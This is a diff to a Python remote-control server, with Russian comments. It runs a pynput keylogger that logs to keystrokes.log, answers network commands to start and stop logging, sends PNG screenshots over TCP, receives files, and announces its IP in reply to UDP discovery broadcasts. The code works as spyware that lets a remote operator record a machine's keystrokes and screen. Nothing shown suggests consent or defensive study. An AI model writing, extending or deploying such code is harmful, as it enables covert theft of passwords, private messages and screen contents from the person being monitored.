@@ -1,12 +1,10 @@
-import pickle
 import socket
-import threading
-import atexit
 import os
 import struct
-import sys
 import pyautogui
 from pynput.keyboard import Listener
+from PIL import Image
+import io
 
 # Константы
 FILE_NAME = "./keystrokes.log"
@@ -45,16 +43,34 @@ def onexit():
         keyboard_listener.stop()  # Останавливаем слушатель
 
 
-# Обработка входящих соединений
+# Получаем локальный IP-адрес
+def get_local_ip():
+    # Получаем список всех адресов, связанных с текущим хостом
+    ip_info = socket.getaddrinfo(socket.gethostname(), None)
+    for ip in ip_info:
+        if ip[4][0].startswith("192.168.0") or ip[4][0].startswith("192.168.1"):
+            return ip[4][0]
+    return None
+
+
+# Функция для получения IP через UDP
+def udp_broadcast_listener():
+    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as server_socket:
+        server_socket.bind(('', 8081))  # Используйте другой порт для UDP
+        print("Listening for UDP broadcast...")
+        data, addr = server_socket.recvfrom(1024)  # Ожидание запроса
+        if data.decode('utf-8') == "DISCOVER_SERVER":
+            server_ip = get_local_ip()
+            server_socket.sendto(f"SERVER_IP:{server_ip}".encode('utf-8'), addr)
+            print(f"Sent server IP: {server_ip}")
+
+
+# Обработка входящих TCP соединений
 def handle_client(conn):
     global recording, output, keyboard_listener
     print("Client connected")
 
     try:
-        # Отправка IP-адреса сервера
-        ip_address = socket.gethostbyname(socket.gethostname())
-        conn.sendall(f"SERVER_IP:{ip_address}".encode('utf-8'))
-
         while True:
             command = conn.recv(1024).decode('utf-8')
             if command:
@@ -67,7 +83,6 @@ def handle_client(conn):
                     print("Attempting to start keylogger...")
                     recording = True
                     output = open(FILE_NAME, "a")
-                    atexit.register(onexit)
                     log_action("Started recording keyboard inputs.")
                     print("Starting Listener...")
                     keyboard_listener = Listener(on_press=on_press)
@@ -75,7 +90,6 @@ def handle_client(conn):
                     print("Listener started...")
                     conn.sendall("Keylogger started.".encode('utf-8'))
                     print("Keylogger started.")
-
                 else:
                     conn.sendall("Keylogger is already running.".encode('utf-8'))
 
@@ -103,9 +117,14 @@ def handle_client(conn):
                 conn.sendall("Logs cleared.".encode('utf-8'))
 
             elif command == "screenshot":
+                # Take a screenshot
                 screenshot = pyautogui.screenshot()
-                imageBytes = pickle.dumps(screenshot)
-                conn.sendall(struct.pack(">Q", len(imageBytes)) + imageBytes)
+                byte_io = io.BytesIO()
+                screenshot.save(byte_io, format='PNG')  # Save the screenshot to the byte stream
+                image_data = byte_io.getvalue()
+                # Send the size of the image first
+                conn.sendall(struct.pack(">Q", len(image_data)))
+                conn.sendall(image_data)
                 print("Screenshot sent.")
 
             elif command.startswith("receive_file:"):
@@ -165,44 +184,21 @@ def handle_client(conn):
         print("Error:", str(e))
 
 
-
 def start_server():
-    threading.Thread(target=udp_broadcast_listener, daemon=True).start()
+    # Запускаем UDP слушатель
+    udp_broadcast_listener()
 
+    # Создаем TCP соединение
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
         server_socket.bind(('0.0.0.0', 8080))
         server_socket.listen(1)
         print("Server listening on port 8080")
+
         while True:
             conn, addr = server_socket.accept()
             print("Connection from {}".format(addr))
-            threading.Thread(target=handle_client, args=(conn,)).start()
-
-
-def get_local_ip():
-    # Получаем список всех адресов, связанных с текущим хостом
-    ip_info = socket.getaddrinfo(socket.gethostname(), None)
-    for ip in ip_info:
-        if ip[4][0].startswith("192.168.0") or ip[4][0].startswith("192.168.1"):
-            return ip[4][0]
-    return None
-
-
-def udp_broadcast_listener():
-    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as server_socket:
-        server_socket.bind(('', 8081))  # Use a different port for UDP broadcasts
-        print("Server listening for broadcast...")
-        while True:
-            data, addr = server_socket.recvfrom(1024)
-            if data.decode('utf-8') == "DISCOVER_SERVER":
-                server_ip = get_local_ip()
-                server_socket.sendto(f"SERVER_IP:{server_ip}".encode('utf-8'), addr)
+            handle_client(conn)  # Обрабатываем клиентское соединение
 
 
 if __name__ == "__main__":
-    while True:
-        try:
-            start_server()
-        except Exception as e:
-            print("Error occurred:", e)
-            continue
+    start_server()
